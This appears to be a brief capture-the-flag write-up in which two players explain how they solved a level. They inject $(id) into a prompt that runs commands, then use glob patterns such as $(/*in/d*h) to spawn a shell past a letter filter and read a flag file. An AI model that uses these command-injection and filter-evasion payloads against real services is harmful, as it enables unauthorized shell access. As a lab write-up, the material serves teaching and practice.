@@ -1,0 +1,24 @@
+Chris:
+Tried to get a shell after figuring out that I could launch command this manner :
+
+$(id)
+
+Your input:
+$(id)
+Your command is: uid=1001(level2) gid=1001(level2) groups=1001(level2)
+Your input:
+
+I wanted to get a shell so I used the glob expand bash feature :
+
+I used "dash" because I could not use the "b" letter :
+
+$(/*in/d*h)
+cat flag.txt
+exit
+Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
+Your input:
+
+Then a writeup was written and the challenge update to outlaw the letter D as well.
+
+James:
+I did the same thing but using $(/*in/?h) to get a sh shell
